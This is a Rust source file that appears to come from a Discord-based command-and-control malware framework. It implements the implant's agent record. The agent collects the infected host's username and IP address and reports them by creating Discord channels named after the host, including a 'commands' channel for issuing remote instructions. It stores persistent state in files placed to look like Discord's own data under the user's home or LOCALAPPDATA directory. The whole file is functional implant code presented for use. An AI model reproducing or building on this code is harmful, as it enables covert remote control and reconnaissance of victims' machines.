use crate::{
    discord_utils::channels::*,
    errors::DiscordC2Error,
    os::recon_utils::{ip, user},
};

#[cfg(target_os = "linux")]
use std::fs::create_dir_all;

use std::{
    env, fmt,
    fs::{File, OpenOptions},
    io::{Read, Write},
    path::Path,
};

use serde::{Deserialize, Serialize};
use serenity::{client::Context, model::id::ChannelId};
use tracing::error;

#[derive(Serialize, Deserialize)]
pub struct Agent {
    category_channel: ChannelId,
    command_channel: ChannelId,
    hostname_user: String,
    ip_address: String,
    session_channel: Option<ChannelId>,
}

impl Agent {
    pub fn new(
        category_channel: ChannelId,
        command_channel: ChannelId,
        hostname_user: String,
        ip_address: String,
    ) -> Result<Agent, DiscordC2Error> {
        let agent = Agent {
            category_channel,
            command_channel,
            hostname_user,
            ip_address,
            session_channel: None,
        };
        agent.write()?;
        Ok(agent)
    }

    pub fn load() -> Result<Option<Agent>, DiscordC2Error> {
        // Load the file or throw an error
        let mut file = get_config()?;

        // Read the contents of the file
        let mut config_data = String::new();
        file.read_to_string(&mut config_data).map_err(|err| {
            println!("Error reading config file: {}", err);
            DiscordC2Error::from(err)
        })?;

        // if the contents of the agent file is blank, don't bother trying to deserialise because this is
        // the initial agent creation
        if !config_data.is_empty() {
            // Deserialize the JSON data into an Agent object
            let agent = serde_json::from_str(&config_data)
                .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
            Ok(Some(agent))
        } else {
            // Return null, indicating that this is the initial agent creation.
            Ok(None)
        }
    }

    fn write(&self) -> Result<(), DiscordC2Error> {
        // Open the config file for writing
        let mut file = get_config()?;

        // Truncate the file to 0 bytes (this fixes the JSON parser error where session go from epoch's to null)
        file.set_len(0).map_err(DiscordC2Error::from)?;

        // Serialize the Agent object to JSON
        let agent_json = serde_json::to_string(&self)
            .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;

        // Write the JSON data to the file
        file.write_all(agent_json.as_bytes())
            .map_err(DiscordC2Error::from)?;

        Ok(())
    }

    /* Getters */
    pub fn get_category_channel(&self) -> &ChannelId {
        &self.category_channel
    }

    pub fn get_command_channel(&self) -> &ChannelId {
        &self.command_channel
    }

    pub fn get_ip_address(&self) -> &str {
        &self.ip_address
    }

    pub fn get_session_channel(&self) -> &Option<ChannelId> {
        &self.session_channel
    }
    /* Getters */

    /* Setters */
    pub fn set_session_channel(
        &mut self,
        session_channel: Option<ChannelId>,
    ) -> Result<(), DiscordC2Error> {
        self.session_channel = session_channel;
        self.write()
    }
    /* Setters */
}

impl fmt::Display for Agent {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(
            f,
            "Agent {{ category_channel: {}, commands_channel: {} hostname_user: {:?}, ip_address: {:?} }}",
            self.category_channel, self.command_channel, self.hostname_user, self.ip_address
        )
    }
}

// Helper method for getting the config file pointer for Windows
#[cfg(target_os = "windows")]
fn get_config() -> Result<File, DiscordC2Error> {
    // Get all the config directory paths
    let app_data_dir =
        env::var("LOCALAPPDATA").map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;
    let config_dir = Path::new(&app_data_dir);
    let file_path = config_dir.join("config.txt");

    // Create the config file and return the File, or return the File if it doesn't exist
    let file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(file_path)
        .map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;

    Ok(file)
}

// Helper method for getting the config file pointer for Linux
#[cfg(target_os = "linux")]
fn get_config() -> Result<File, DiscordC2Error> {
    // let's try to use the user's home directory $HOME/.local/share/discord/config
    let home_dir = env::var("HOME").map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;
    let config_dir = Path::new(&home_dir).join(".local/share/discord"); // dir
    let config_file = Path::new(&config_dir).join("config"); // dir + file, so we don't create a dir named config

    // if we can't even create the folders, don't try creating the file
    create_dir_all(&config_dir).map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;

    let file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(&config_file)
        .map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;

    Ok(file)
}

// Public helper method to either load the agent or create a new one assuming it doesn't exist (or there was an error)
pub async fn get_or_create_agent(ctx: &Context) -> Agent {
    async fn create_agent(ctx: &Context) -> Agent {
        // Find the hostname/IP of our agent
        let (hostname, ip) = (user(), ip().await.unwrap());

        // Create the channels
        let category_id = create_category_channel(ctx, format!("{} - {}", hostname, ip))
            .await
            .unwrap(); // TODO: Better error handling
        let command_id = create_text_channel(
            ctx,
            "commands",
            &category_id,
            "This is the central command center for your agent. Run some slash commands here!",
        )
        .await
        .unwrap(); // TODO: Better error handling

        // Instantiate the agent
        let agent = Agent::new(category_id, command_id, hostname, ip);
        agent.unwrap()
    }

    match Agent::load() {
        Ok(Some(agent)) => agent,
        Ok(None) => create_agent(ctx).await,
        Err(why) => {
            error!("Error loading agent, so one was created: {}", why);
            create_agent(ctx).await
        }
    }
}
